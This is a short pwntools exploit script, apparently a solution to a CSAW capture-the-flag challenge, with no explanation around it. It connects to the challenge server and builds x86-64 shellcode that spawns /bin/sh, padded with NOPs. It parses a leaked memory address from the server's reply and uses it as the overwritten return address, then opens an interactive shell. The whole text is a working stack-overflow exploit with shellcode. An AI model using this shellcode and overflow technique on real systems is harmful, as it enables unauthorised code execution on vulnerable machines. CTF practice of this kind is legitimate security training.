from pwn import *

r = remote('pwn.chal.csaw.io', 8464)
buf = ''
buf += '\x6A\x3B\x58\x99\x52\x5E\x48\xB9'
buf += '\x2F\x62\x69\x6E\x2F\x2F\x73\x68'
buf += '\x52\x51\x54\x5F\x0F\x05'
buf += '\x90' * 18
print "[+] Getting memory leak\n"
r.recvline_contains("Good Luck Pilot!")
memleak = r.recvline()
buf += p64(int(memleak[12:26:],16))
print "[+] Sending payload\n"
r.sendline(buf)
print "[+] Entering interactive mode\n"
r.interactive()
